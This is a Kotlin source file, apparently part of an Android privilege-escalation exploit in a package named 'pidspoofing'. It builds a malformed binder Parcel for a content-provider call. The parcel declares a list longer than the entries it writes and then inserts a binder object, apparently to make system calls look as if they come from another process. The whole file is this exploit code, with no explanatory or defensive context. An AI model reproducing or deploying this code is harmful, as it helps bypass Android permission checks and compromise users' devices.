package jp.plum.pidspoofing

import android.content.ContentProviderOperation
import android.content.Context
import android.content.IContentProvider
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.os.Parcel

val Context.TAG
    get() = "natsuki"

data class Ropes(val src: List<String>, val limit: Int, val lock: IBinder) {
    companion object {
        private const val ClazzName = "android.content.pm.StringParceledListSlice"
        private const val ExtraKey = "foobar"
    }

    init {
        require(limit < src.size) {
            "limit($limit) must less than src.size(${src.size})"
        }
    }

    context(Context)
    fun buildParcel(
        request: ContentProviderOperation,
        authority: String,
    ) = Parcel.obtain().apply {
        writeInterfaceToken(IContentProvider.descriptor)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            attributionSource.writeToParcel(this, 0)
        }
        writeString(authority)
        writeInt(1) // size
        writeInt(request.type)
        Uri.writeToParcel(this, request.uri)
        // method, args, value, extra-size, array-map size
        listOf(0, 0, -1, 1, 1).forEach(::writeInt)
        writeString(ExtraKey)
        writeInt(4)
        writeString(ClazzName)
        writeInt(src.size)
        (0 until limit).forEach { pos ->
            writeInt(1)
            writeString(src[pos])
        }
        writeInt(0)
        writeStrongBinder(lock)
        // selection, args, expected-count, yield, exception
        listOf(0, -1, -1, 0, 0).forEach(::writeInt)
    }!!
}